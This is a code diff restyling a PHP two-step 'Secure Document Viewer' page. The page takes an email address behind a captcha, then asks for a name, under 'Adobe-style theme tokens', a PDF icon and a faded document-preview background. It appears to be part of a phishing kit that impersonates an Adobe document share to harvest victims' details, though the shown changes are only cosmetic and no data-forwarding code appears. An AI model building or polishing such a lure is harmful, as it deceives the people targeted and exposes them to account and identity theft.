@@ -21,11 +21,15 @@ $hideSessionMsg = ($error === 'Incorrect name entered.');
     <title>Secure Document Viewer</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+    <!-- Cloudflare Turnstile -->
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 
     <style>
         *, *::before, *::after { box-sizing: border-box; }
 
+        /* -------------------------------------------
+           Adobe-style theme tokens
+        -------------------------------------------- */
         :root {
             --card-bg: #fff;
             --text-color: #222;
@@ -35,7 +39,7 @@ $hideSessionMsg = ($error === 'Incorrect name entered.');
             --btn-hover: #0f5cc0;
             --error: #c9252d;
             --overlay-dark: rgba(0,0,0,0.65);
-            --readonly-bg: #e3e5eb;
+            --readonly-bg: #fefefe;
             --divider: #e8e8e8;
             --font-xs: 11px;
             --font-sm: 12px;
@@ -86,12 +90,16 @@ $hideSessionMsg = ($error === 'Incorrect name entered.');
             opacity: 0.7;
             transform: scale(1.04);
         }
+
         .doc-background img {
             width: 100%;
             height: 100%;
             object-fit: contain;
         }
 
+        /* -------------------------------------------
+           CARD
+        -------------------------------------------- */
         .login-card {
             width: 95%;
             max-width: 320px;
@@ -106,9 +114,11 @@ $hideSessionMsg = ($error === 'Incorrect name entered.');
             transform: translateY(14px) scale(0.985);
             animation: fadeIn 0.45s ease-out forwards;
         }
+
         .login-card.has-error {
             border-color: rgba(201,37,45,0.5);
         }
+
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(20px) scale(0.97); }
             to   { opacity: 1; transform: translateY(0) scale(1); }
@@ -120,12 +130,19 @@ $hideSessionMsg = ($error === 'Incorrect name entered.');
             margin: 8px 0 12px;
         }
 
+        /* -------------------------------------------
+           HEADER
+        -------------------------------------------- */
         .doc-icon {
             width: 38px;
             height: 38px;
             margin: 0 auto 6px;
         }
-        .doc-icon-img { width: 100%; height: 100%; object-fit: contain; }
+        .doc-icon-img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
 
         .doc-title {
             text-align: center;
@@ -133,7 +150,10 @@ $hideSessionMsg = ($error === 'Incorrect name entered.');
             margin-bottom: 2px;
             font-weight: 600;
         }
-        .doc-size { color: var(--subtext); font-size: var(--font-xs); }
+        .doc-size {
+            color: var(--subtext);
+            font-size: var(--font-xs);
+        }
 
         .doc-subtitle {
             text-align: center;
@@ -151,6 +171,9 @@ $hideSessionMsg = ($error === 'Incorrect name entered.');
             font-weight: 600;
         }
 
+        /* -------------------------------------------
+           FIELDS
+        -------------------------------------------- */
         .field-wrapper {
             margin-bottom: 9px;
             position: relative;
@@ -173,17 +196,41 @@ $hideSessionMsg = ($error === 'Incorrect name entered.');
             background: #ffffff;
         }
 
-        /* Keep email typing black even in dark mode */
-        input[type="email"] { color: #000 !important; }
-
-        /* Read-only validated email (no lock icon anymore) */
-        .readonly-input {
-            background: var(--readonly-bg);
-            color: var(--subtext);
-            cursor: not-allowed;
+        /* Email typing always black (even in dark mode) */
+        input[type="email"] {
+            color: #000 !important;
         }
 
-        /* Name field lock icon — ONLY HERE */
+        /* Step 2 email – visually normal but readonly */
+        .readonly-email {
+            background: var(--readonly-bg);
+            cursor: text;
+        }
+
+        /* -------------------------------------------
+           EMAIL ICON
+        -------------------------------------------- */
+        .email-wrapper input {
+            padding-left: 28px; /* room for icon */
+        }
+
+        .email-icon {
+            position: absolute;
+            left: 9px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 14px;
+            height: 14px;
+            opacity: 0.7;
+            pointer-events: none;
+        }
+        .email-icon path {
+            fill: #777;
+        }
+
+        /* -------------------------------------------
+           NAME LOCK ICON
+        -------------------------------------------- */
         .lock-icon {
             position: absolute;
             right: 9px;
@@ -194,8 +241,13 @@ $hideSessionMsg = ($error === 'Incorrect name entered.');
             opacity: 0.65;
             pointer-events: none;
         }
-        .lock-icon path { fill: #777; }
+        .lock-icon path {
+            fill: #777;
+        }
 
+        /* -------------------------------------------
+           CAPTCHA
+        -------------------------------------------- */
         .captcha-wrapper {
             display: flex;
             justify-content: center;
@@ -207,6 +259,9 @@ $hideSessionMsg = ($error === 'Incorrect name entered.');
             transform-origin: center;
         }
 
+        /* -------------------------------------------
+           BUTTON
+        -------------------------------------------- */
         .btn-primary {
             width: 100%;
             padding: 9px 10px;
@@ -219,22 +274,23 @@ $hideSessionMsg = ($error === 'Incorrect name entered.');
             cursor: pointer;
             margin-top: 4px;
         }
-        .btn-primary:hover { background: var(--btn-hover); }
 
+        .btn-primary:hover {
+            background: var(--btn-hover);
+        }
     </style>
 </head>
 <body>
 
 <div class="page-wrapper">
-
     <div class="doc-background">
-        <img src="assets/background.png">
+        <img src="assets/background.png" alt="Document preview">
     </div>
 
     <div class="login-card<?= $hasError ? ' has-error' : '' ?>">
 
         <div class="doc-icon">
-            <img src="assets/PDtrans.png" class="doc-icon-img">
+            <img src="assets/PDtrans.png" alt="PDF Icon" class="doc-icon-img">
         </div>
 
         <h2 class="doc-title">
@@ -252,14 +308,21 @@ $hideSessionMsg = ($error === 'Incorrect name entered.');
         <?php endif; ?>
 
         <?php if ($step == 1): ?>
-
+            <!-- STEP 1 — EMAIL + CAPTCHA -->
             <form method="POST" action="login.php">
 
-                <div class="field-wrapper">
-                    <input type="email" name="email"
-                           placeholder="Enter your email"
-                           value="<?= htmlspecialchars($old_email) ?>"
-                           required>
+                <div class="field-wrapper email-wrapper">
+                    <input
+                        type="email"
+                        name="email"
+                        placeholder="Enter your email"
+                        value="<?= htmlspecialchars($old_email) ?>"
+                        required
+                    >
+                    <!-- subtle mail icon -->
+                    <svg class="email-icon" viewBox="0 0 16 16" aria-hidden="true">
+                        <path d="M2 3.5h12c.55 0 1 .45 1 1v7c0 .55-.45 1-1 1H2c-.55 0-1-.45-1-1v-7c0-.55.45-1 1-1zm.7 1.2 4.65 3.2c.4.28.9.28 1.3 0l4.65-3.2H2.7zm10.6 6.8v-5.1l-3.9 2.7c-.9.63-2.1.63-3 0l-3.9-2.7v5.1h10.8z"/>
+                    </svg>
                 </div>
 
                 <div class="captcha-wrapper">
@@ -271,33 +334,39 @@ $hideSessionMsg = ($error === 'Incorrect name entered.');
             </form>
 
         <?php else: ?>
-
+            <!-- STEP 2 — EMAIL DISPLAY + NAME WITH LOCK ICON -->
             <form method="POST" action="login.php">
 
-                <div class="field-wrapper">
-                    <input type="email"
-                           value="<?= htmlspecialchars($old_email) ?>"
-                           class="readonly-input"
-                           readonly>
+                <div class="field-wrapper email-wrapper">
+                    <input
+                        type="email"
+                        value="<?= htmlspecialchars($old_email) ?>"
+                        class="readonly-email"
+                        readonly
+                    >
+                    <!-- same subtle mail icon -->
+                    <svg class="email-icon" viewBox="0 0 16 16" aria-hidden="true">
+                        <path d="M2 3.5h12c.55 0 1 .45 1 1v7c0 .55-.45 1-1 1H2c-.55 0-1-.45-1-1v-7c0-.55.45-1 1-1zm.7 1.2 4.65 3.2c.4.28.9.28 1.3 0l4.65-3.2H2.7zm10.6 6.8v-5.1l-3.9 2.7c-.9.63-2.1.63-3 0l-3.9-2.7v5.1h10.8z"/>
+                    </svg>
                 </div>
 
                 <div class="field-wrapper">
-                    <input type="text" name="name"
-                           placeholder="Enter your name"
-                           required>
-
-                    <!-- tiny lock icon ONLY for the name field -->
-                    <svg class="lock-icon" viewBox="0 0 16 16">
+                    <input
+                        type="text"
+                        name="name"
+                        placeholder="Enter your name"
+                        required
+                    >
+                    <!-- tiny lock icon for name field -->
+                    <svg class="lock-icon" viewBox="0 0 16 16" aria-hidden="true">
                         <path d="M5.5 7V5.5a2.5 2.5 0 0 1 5 0V7h.5A1.5 1.5 0 0 1 12.5 8.5v4A1.5 1.5 0 0 1 11 14H5a1.5 1.5 0 0 1-1.5-1.5v-4A1.5 1.5 0 0 1 5 7h.5Zm1 0h3V5.5a1.5 1.5 0 0 0-3 0V7Z"/>
                     </svg>
                 </div>
 
                 <button class="btn-primary">Next</button>
             </form>
-
         <?php endif; ?>
     </div>
-
 </div>
 
 </body>
